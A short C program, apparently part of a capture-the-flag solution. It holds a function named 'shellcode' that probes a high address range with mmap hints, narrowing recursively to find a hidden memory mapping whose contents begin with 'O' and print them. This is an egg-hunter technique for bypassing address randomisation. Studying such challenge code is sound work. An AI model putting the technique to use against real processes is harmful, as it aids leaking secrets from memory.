#include <sys/mman.h>
#include <stdio.h>
#include <unistd.h>

#define ADDR_MIN   0x0000100000000000UL
#define ADDR_MASK  0x00000ffffffff000UL

void *search(void *l, void *r, unsigned long unit) {
	if (unit < 0x1000) {
		if (*(char *)l == 'O') {
			puts((char *)l);
			return l;
		} else {
			puts("red herring");
			return MAP_FAILED;
		}
	}

	printf("(range, unit): (%p-%p, %#lx)\n", l, r, unit);

	for (void *addr_expect = l; addr_expect < r; addr_expect += unit) {
		void * const addr_result = mmap(addr_expect, unit, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
		if (addr_result == addr_expect) {
			munmap(addr_result, unit);
		} else {
			if (addr_result == MAP_FAILED) {
				return MAP_FAILED;
			} else {
				munmap(addr_result, unit);
				void * const result = search(addr_expect, addr_expect + unit, unit >> 1);
				if (result != MAP_FAILED) {
					return result;
				}
			}
		}
	}

	return MAP_FAILED;
}

void *shellcode()
{
	return search((void *)ADDR_MIN, (void *)(ADDR_MIN * 2), 0x4000000UL);
}
